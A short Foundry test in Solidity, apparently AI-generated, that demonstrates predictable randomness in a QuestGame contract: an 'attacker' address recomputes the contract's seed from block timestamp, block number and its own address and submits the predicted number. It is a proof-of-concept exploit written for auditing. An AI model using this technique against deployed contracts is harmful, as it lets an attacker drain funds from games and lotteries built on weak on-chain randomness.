// Generation Time: 37,41s
// Input Tokens: 2102
// Output Tokens: 306
// Reasoning Tokens: 1330


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public questGame;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        questGame = new QuestGame{value: 5 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        vm.assume(blockTimestamp > 0);
        vm.assume(blockNumber > 0);
        
        uint256 cooldown = 1 hours;
        vm.assume(blockTimestamp >= cooldown);
        
        vm.deal(address(0x1234), 1 ether);
        
        vm.warp(blockTimestamp);
        vm.roll(blockNumber);
        
        address attacker = address(0x1234);
        vm.startPrank(attacker);
        
        bytes32 seedHash = keccak256(abi.encodePacked(blockTimestamp, blockNumber, attacker));
        uint256 expectedGeneratedNumber = uint256(seedHash) % 100;
        
        questGame.attemptQuest{value: 0.1 ether}(expectedGeneratedNumber);
        
        vm.stopPrank();
    }
}
